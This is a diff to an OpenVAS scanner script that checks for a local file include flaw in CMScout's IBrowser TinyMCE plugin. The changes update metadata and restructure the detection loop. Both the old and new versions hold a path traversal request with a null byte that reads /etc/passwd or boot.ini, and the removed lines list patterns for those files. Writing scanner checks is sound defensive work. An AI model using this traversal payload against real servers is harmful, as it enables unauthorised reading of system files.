@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_CMScout_43260.nasl 5263 2017-02-10 13:45:51Z teissa $
+# $Id: gb_CMScout_43260.nasl 5760 2017-03-29 10:24:17Z cfi $
 #
 # CMScout IBrowser TinyMCE Plugin Local File Include Vulnerability
 #
@@ -33,12 +33,11 @@ webserver process. This may aid in further attacks.
 
 CMScout 2.09 is vulnerable; other versions may also be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100807);
- script_version("$Revision: 5263 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-10 14:45:51 +0100 (Fri, 10 Feb 2017) $");
+ script_version("$Revision: 5760 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 12:24:17 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-09-16 16:08:48 +0200 (Thu, 16 Sep 2010)");
  script_bugtraq_id(43260);
  script_tag(name:"cvss_base", value:"6.8");
@@ -52,7 +51,7 @@ if (description)
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "summary" , value : tag_summary);
@@ -61,28 +60,27 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
+include("host_details.inc");
+
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/cms","/cmscout",cgi_dirs());
-files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");
+files = traversal_files();
 
+foreach dir( make_list_unique( "/cms", "/cmscout", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
+  if( dir == "/" ) dir = "";
+
   foreach file (keys(files)) {
 
-    url = string(dir, "/tiny_mce/plugins/ibrowser/ibrowser.php?lang=../../../../../../../../../../../../../",files[file],"%00"); 
+    url = string(dir, "/tiny_mce/plugins/ibrowser/ibrowser.php?lang=../../../../../../../../../../../../../",files[file],"%00");
 
     if(http_vuln_check(port:port, url:url,pattern:file)) {
-
-      security_message(port:port);
-      exit(0);
-
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
 
-exit(0);
+exit( 99 );
